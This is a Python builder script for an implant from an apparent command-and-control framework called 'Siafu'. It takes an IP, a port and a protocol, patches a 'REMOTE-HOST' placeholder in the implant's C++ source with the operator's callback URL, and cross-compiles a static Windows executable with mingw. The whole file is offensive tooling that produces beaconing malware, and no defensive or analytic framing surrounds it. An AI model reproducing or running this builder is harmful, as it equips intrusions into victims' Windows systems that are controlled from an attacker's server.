#!/usr/bin/env python3

import sys
import os
import subprocess
import shutil
import glob

global temp_folder

def get_base_folder():
    builder_dir = os.path.dirname(os.path.realpath(__file__))
    
    # Navigate up to the base folder "Siafu"
    base_folder = os.path.abspath(os.path.join(builder_dir, "..", ".."))
    
    return base_folder

def main():
    global temp_folder

    if len(sys.argv) != 4:
        print("Usage: python3 builder.py <IP> <port> <protocol>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    proto = sys.argv[3]

    siafu_base = get_base_folder()

    folder_name = "Builder-Output"
    output_folder = os.path.join(siafu_base, folder_name)
    
    if not os.path.exists(output_folder):
        try:
            os.makedirs(output_folder)
        except OSError as e:
            print(f"Error creating folder '{output_folder}': {e}")
            sys.exit(1)
    elif not os.path.isdir(output_folder):
        print(f"'{output_folder}' exists but is not a directory.")
        sys.exit(2)

    implant_name = f"{proto}_{port}"

    implant_folder = os.path.join(siafu_base, "Implant")
    temp_folder = os.path.join(output_folder, "temp")
    include_folder = os.path.join(implant_folder, "include")

    if os.path.exists(implant_folder) and os.path.isdir(implant_folder):
        if os.path.exists(temp_folder):
            shutil.rmtree(temp_folder)

        # Create temp_folder
        os.makedirs(temp_folder)

        if proto == "http":
            http_folder = os.path.join(implant_folder, "http")
            shutil.copytree(http_folder, os.path.join(temp_folder, "http"))
            shutil.copytree(include_folder, os.path.join(temp_folder, "include"))
            replaceItems(proto, ip, port, temp_folder)
            build(proto, temp_folder, output_folder, include_folder, implant_name)
        elif proto == "https":
            https_folder = os.path.join(implant_folder, "https")
            shutil.copytree(https_folder, os.path.join(temp_folder, "https"))
            shutil.copytree(include_folder, os.path.join(temp_folder, "include"))
            replaceItems(proto, ip, port, temp_folder)
            build(proto, https_folder, output_folder, include_folder, implant_name)
        else:
            print("Invalid protocol specified.")
            sys.exit(4)
        pass
    else:
        print("Implant code not available.")
        sys.exit(3)

def replaceItems(proto, ip, port, temp_folder):
    formed_url = f"{proto}://{ip}:{port}/{port}"
    file_path = os.path.join(temp_folder, proto, "implant.cpp")
    with open(file_path, "r") as file:
        filedata = file.read()

    old_string = 'std::string url = "REMOTE-HOST";'
    new_string = 'std::string url = "{}";'.format(formed_url)
    filedata = filedata.replace(old_string, new_string)

    with open(file_path, "w") as file:
        file.write(filedata)

def build(proto, temp_folder_folder, output_folder, include_folder, implant_name):
    proto_folder = os.path.join(temp_folder, proto)
    cpp_files = glob.glob(os.path.join(proto_folder, "*.cpp"))

    x64EXE = [
    "x86_64-w64-mingw32-g++",
    "-g",
    "-std=c++17",
    "-I",
    include_folder,
    "-I",
    "/usr/x86_64-w64-mingw32/include",
    "-I",
    "/Siafu/Implant/include/zlib",
    ] + cpp_files + [
    "-o",
    os.path.join(output_folder, implant_name + ".exe"),
    "-m64",
    "-static-libgcc",
    "-static-libstdc++",
    "-lws2_32",
    "-liphlpapi",
    "-mconsole",
    "-lpthread"
    ]
    subprocess.run(x64EXE)



if __name__ == "__main__":
    main()

